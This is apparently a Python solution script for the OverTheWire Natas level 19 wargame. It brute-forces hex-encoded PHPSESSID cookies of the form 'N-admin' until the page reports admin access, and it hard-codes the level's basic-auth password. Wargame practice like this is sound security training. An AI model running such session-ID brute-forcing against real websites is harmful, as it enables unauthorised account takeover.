#!/bin/python
import requests
import binascii

url = "http://natas19.natas.labs.overthewire.org/"
auth_username = "natas19"
auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
exist_str = "You are an admin."
params = dict(username='admin',password='hoge')

for i in range(0,999):
    c = ''.join([str(i),'-admin'])
    cookies = dict(PHPSESSID=str(c.encode().hex()))
    r = requests.get(url, auth=(auth_username,auth_password), cookies=cookies, params=params)
    print(f"Now charange number is [{c}] in hex:{c.encode().hex()}")
    if exist_str in r.text:
        print(f"[+] admin cookie is [{c}]")
        break
print(r.text)